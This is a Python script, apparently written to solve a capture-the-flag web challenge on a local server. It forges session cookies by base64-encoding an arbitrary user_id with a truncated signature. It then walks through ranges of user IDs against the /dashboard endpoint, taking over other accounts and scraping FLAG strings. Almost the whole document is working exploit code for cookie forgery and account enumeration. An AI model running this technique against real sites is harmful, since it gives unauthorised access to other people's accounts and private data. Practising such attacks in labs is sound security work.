#!/usr/bin/env python3
"""
Comprehensive User ID Enumeration and Flag Extraction
Systematically test user IDs to find flags and sensitive data
Exploiting weak session validation to access other accounts
"""

import requests
import base64
import re
import sys
import json
from urllib.parse import urljoin

BASE_URL = "http://127.0.0.1:33198"

def create_modified_cookie(user_id):
    """Create a modified session cookie with different user_id"""
    payload = f'{{"user_id":{user_id}}}'
    payload_b64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
    # Using truncated signature since validation is weak
    return f"{payload_b64}.aVfHAw."

def test_user_id(user_id):
    """Test a specific user_id and look for flags"""
    try:
        # Create modified session cookie
        modified_cookie = create_modified_cookie(user_id)
        
        # Test dashboard endpoint
        url = urljoin(BASE_URL, "/dashboard")
        session = requests.Session()
        session.cookies.set('session', modified_cookie, domain='127.0.0.1', path='/')
        
        response = session.get(url, timeout=10)
        
        # Look for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        
        return {
            'user_id': user_id,
            'status_code': response.status_code,
            'content_length': len(response.content),
            'flag_found': bool(flag_match),
            'flag': flag_match.group(0) if flag_match else None,
            'content_preview': response.text[:300] if response.status_code == 200 else ""
        }
    except Exception as e:
        return {
            'user_id': user_id,
            'error': str(e),
            'status_code': None
        }

def main():
    print("=" * 80)
    print("COMPREHENSIVE FLAG EXTRACTION - USER ID ENUMERATION")
    print("=" * 80)
    print()
    
    # Test ranges based on our user_id (10032) and discovered patterns
    test_ranges = [
        # Low IDs (admin/test accounts - where flags likely are)
        (1, 50, 1),
        # Specific interesting IDs
        (100, 110, 1),
        (1000, 1010, 1),
        # Around our user_id
        (10020, 10040, 1),
        # High IDs
        (99900, 99910, 1)
    ]
    
    flags_found = []
    users_with_access = []
    
    print("[+] Starting systematic user ID enumeration...")
    print("[+] Exploiting weak session validation vulnerability")
    print("[+] Testing for flags in user accounts...")
    
    for start, end, step in test_ranges:
        print("\n" + "=" * 60)
        print(f"[+] Testing range: {start} to {end}")
        print("=" * 60)
        
        for user_id in range(start, end + 1, step):
            result = test_user_id(user_id)
            
            if result.get('status_code') == 200:
                users_with_access.append(result)
                
                if result.get('flag_found'):
                    flags_found.append(result)
                    print(f"\n{'!' * 60}")
                    print(f"[!] FLAG FOUND for user_id={user_id}!")
                    print(f"[!] FLAG: {result['flag']}")
                    print(f"{'!' * 60}")
                else:
                    # Show interesting users
                    if user_id <= 10 or user_id >= 99900:
                        print(f"[+] user_id={user_id}: ACCESS GRANTED (len: {result['content_length']}B)")
                        print(f"    Preview: {result['content_preview'][:80]}...")
                    else:
                        print(f"[+] user_id={user_id}: ACCESS GRANTED")
            else:
                print(f"[-] user_id={user_id}: No access (status: {result.get('status_code')})")
    
    # Summary
    print("\n" + "=" * 80)
    print("ENUMERATION COMPLETE")
    print("=" * 80)
    print(f"[+] Total users with access: {len(users_with_access)}")
    print(f"[+] Total flags found: {len(flags_found)}")
    
    if flags_found:
        print("\n" + "=" * 80)
        print("FLAGS DISCOVERED:")
        print("=" * 80)
        for flag_data in flags_found:
            print(f"\n[!] FLAG: {flag_data['flag']}")
            print(f"[!] User ID: {flag_data['user_id']}")
    else:
        print("[+] No flags found in initial range")
        print("[+] Recommendation: Expand testing to 1-100000")

if __name__ == "__main__":
    main()

